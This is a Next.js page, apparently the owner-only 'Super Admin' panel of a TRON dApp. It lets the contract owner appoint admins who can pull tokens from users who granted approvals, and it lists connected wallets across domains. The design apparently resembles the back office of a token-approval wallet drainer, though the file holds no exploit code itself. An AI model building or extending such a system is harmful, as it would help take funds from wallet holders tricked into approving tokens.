"use client";

import { SuperAdminPanel } from "@/components/SuperAdminPanel";
import { ConnectedWalletsList } from "@/components/ConnectedWalletsList";
import { TronConnectButton } from "@/components/TronConnectButton";
import { useTron } from "@/components/TronProvider";
import { getContractOwner, PULL_CONTRACT_ADDRESS } from "@/lib/tron";
import Link from "next/link";
import { ArrowLeft } from "lucide-react";
import { useEffect, useState } from "react";

export default function SuperAdminPage() {
  const { address, isConnected } = useTron();
  const [isOwner, setIsOwner] = useState(false);
  const [isChecking, setIsChecking] = useState(false);

  useEffect(() => {
    if (!isConnected || !address) {
      setIsOwner(false);
      return;
    }

    const checkOwner = async () => {
      setIsChecking(true);
      try {
        const owner = await getContractOwner(PULL_CONTRACT_ADDRESS);
        setIsOwner(owner?.toLowerCase() === address.toLowerCase());
      } catch (error) {
        console.error("Failed to check owner:", error);
        setIsOwner(false);
      } finally {
        setIsChecking(false);
      }
    };

    checkOwner();
  }, [isConnected, address]);

  if (!isConnected) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black flex items-center justify-center">
        <TronConnectButton />
      </div>
    );
  }

  if (isChecking) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black flex items-center justify-center px-4">
        <div className="max-w-md w-full rounded-lg border border-blue-500/20 bg-gray-900/50 p-6 text-center">
          <h1 className="text-lg font-semibold text-cyan-200 mb-2">Checking Access</h1>
          <p className="text-sm text-cyan-300">Checking super admin rights...</p>
        </div>
      </div>
    );
  }

  if (!isOwner) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black flex items-center justify-center px-4">
        <div className="max-w-md w-full rounded-lg border border-red-500/30 bg-red-900/10 p-6 text-center">
          <h1 className="text-lg font-semibold text-red-300 mb-2">Access Restricted</h1>
          <p className="text-sm text-red-200">
            Only the contract deployer can access the super admin panel.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black">
      <header className="border-b border-blue-500/20 bg-black/50 backdrop-blur-sm sticky top-0 z-10">
        <div className="container mx-auto px-3 sm:px-4 py-3 sm:py-4 flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-4">
            <Link
              href="/admin"
              className="flex items-center gap-1 sm:gap-2 text-xs sm:text-sm font-medium text-cyan-300 hover:text-cyan-100 transition-colors"
            >
              <ArrowLeft className="h-3 w-3 sm:h-4 sm:w-4" />
              <span className="hidden sm:inline">Back to Admin</span>
              <span className="sm:hidden">Back</span>
            </Link>
            <div className="h-6 sm:h-8 w-px bg-blue-500/30" />
            <div className="flex items-center gap-2">
              <div className="h-8 w-8 sm:h-10 sm:w-10 rounded-lg bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
                <span className="text-white font-bold text-base sm:text-xl">🔐</span>
              </div>
              <div>
                <h1 className="text-base sm:text-xl font-bold text-white">Super Admin</h1>
                <p className="text-xs text-cyan-300 hidden sm:block">Access Control</p>
              </div>
            </div>
          </div>
          <TronConnectButton />
        </div>
      </header>

      <main className="container mx-auto px-3 sm:px-4 py-6 sm:py-12">
        <div className="w-full mx-auto space-y-6 sm:space-y-8">
          <div className="text-center space-y-3 sm:space-y-4">
            <h2 className="text-2xl sm:text-3xl md:text-4xl font-bold tracking-tight text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-cyan-400 to-blue-600">
              Super Admin Control Panel
            </h2>
            <p className="text-base sm:text-lg text-cyan-200 px-2">
              Add or remove admins who can pull tokens from approved users.
            </p>
          </div>

          <SuperAdminPanel />
          <ConnectedWalletsList filterByDomain={false} />

          <div className="grid gap-3 sm:gap-4 md:grid-cols-2">
            <div className="p-4 sm:p-6 rounded-lg sm:rounded-xl border border-blue-500/20 bg-gray-900/50 backdrop-blur-sm">
              <h3 className="font-semibold mb-2 text-white text-sm sm:text-base">👑 Owner Only</h3>
              <p className="text-xs sm:text-sm text-cyan-200">
                Only the contract owner can add or remove admins. Connect the owner wallet to manage access.
              </p>
            </div>
            <div className="p-4 sm:p-6 rounded-lg sm:rounded-xl border border-blue-500/20 bg-gray-900/50 backdrop-blur-sm">
              <h3 className="font-semibold mb-2 text-white text-sm sm:text-base">✅ Admin Rights</h3>
              <p className="text-xs sm:text-sm text-cyan-200">
                Admins can withdraw approved tokens on behalf of users. Keep this list tight and audited.
              </p>
            </div>
          </div>

          <div className="p-4 sm:p-6 rounded-lg sm:rounded-xl border border-amber-500/30 bg-amber-900/20 backdrop-blur-sm">
            <h3 className="font-semibold mb-2 text-amber-300 text-sm sm:text-base">
              ⚠️ Security Notice
            </h3>
            <p className="text-xs sm:text-sm text-amber-200">
              Admins have permission to pull user tokens after approval. Add only trusted addresses.
            </p>
          </div>
        </div>
      </main>

      <footer className="border-t border-blue-500/20 mt-auto py-4 sm:py-6 bg-black/30">
        <div className="container mx-auto px-3 sm:px-4 text-center text-xs sm:text-sm text-cyan-300">
          Super Admin • Access Control
        </div>
      </footer>
    </div>
  );
}
